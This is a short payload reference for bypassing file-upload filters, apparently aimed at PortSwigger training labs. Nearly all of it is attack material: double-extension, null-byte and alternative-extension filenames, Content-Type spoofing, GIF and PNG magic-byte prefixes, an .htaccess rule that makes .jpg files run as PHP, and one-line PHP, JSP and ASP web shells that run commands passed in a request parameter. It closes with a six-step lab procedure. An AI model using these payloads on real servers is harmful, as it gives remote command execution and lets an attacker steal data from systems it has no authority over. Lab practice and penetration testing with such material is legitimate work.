# File Upload Bypass - Payload Reference

## Extension Bypass

### Double Extension
```
shell.php.jpg
shell.php.png
shell.php%00.jpg      # Null byte (older PHP)
shell.php;.jpg        # IIS
shell.php%20          # Trailing space
shell.php.            # Trailing dot
```

### Case Bypass
```
shell.Php
shell.pHP
shell.PHP
```

### Alternative Extensions
```
shell.phtml
shell.php3
shell.php4
shell.php5
shell.pht
shell.phar
shell.phps
shell.pgif
shell.shtml
shell.htaccess
```

## Content-Type Bypass
```
Content-Type: image/png          # Change from application/octet-stream
Content-Type: image/jpeg
Content-Type: image/gif
```

## Magic Bytes Bypass
```
GIF89a;<?php system($_GET['cmd']); ?>     # GIF header before PHP
\x89PNG\r\n\x1a\n;<?php ...              # PNG header
```

## .htaccess Upload
```
# .htaccess file content:
AddType application/x-httpd-php .jpg
# Then upload shell.jpg with PHP code
```

## Web Shell Payloads

### PHP
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```

### JSP
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### ASP
```asp
<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>
```

## PortSwigger Lab Approach
1. Upload normal file first, observe request/response
2. Check if extension is validated (client-side or server-side)
3. Try double extension: shell.php.jpg
4. Try alternative extension: shell.phtml
5. Try Content-Type change
6. Try magic bytes bypass
